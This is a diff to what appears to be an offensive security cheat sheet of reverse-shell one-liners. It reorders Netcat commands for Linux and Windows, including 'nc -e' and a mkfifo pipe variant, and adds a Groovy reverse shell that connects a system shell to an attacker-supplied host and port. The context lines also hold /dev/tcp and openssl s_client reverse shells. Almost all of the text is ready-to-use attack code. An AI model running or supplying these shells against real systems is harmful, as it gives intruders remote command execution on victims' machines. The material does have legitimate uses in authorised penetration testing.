@@ -238,14 +238,17 @@ exec /bin/sh 0</dev/tcp/<IP>/<PORT> 1>&0 2>&0
 ###### [Linux / Windows] Netcat
 
 ```
-# If nc e option available:
+# Linux
+# If nc's "-e" option is available on the targeted system:
 nc -e /bin/sh <IP> <PORT> &
+
+# Otherwise:
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f
+
+# Windows
 # The ncat.exe from https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe offers a better compatibility across Windows systems
 nc.exe -e cmd.exe <IP> <PORT>
 nc64.exe -e cmd.exe <IP> <PORT>
-
-# Else (Linux):
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f
 ```
 
 ###### [Linux] Socat
@@ -352,6 +355,17 @@ Requires a listener that supports `SSL` / `TLS` connections.
 
 ```
 mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <IP>:<PORT> > /tmp/s; rm /tmp/s
+```
+
+###### Groovy
+
+```
+# Source: https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy
+# BINARY: /bin/sh | /usr/bin/bash | cmd.exe | powershell.exe | ...
+String host="<IP | HOSTNAME>";
+int port=<PORT>;
+String cmd="<BINARY>";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
 #### Complete reverse shell scripts
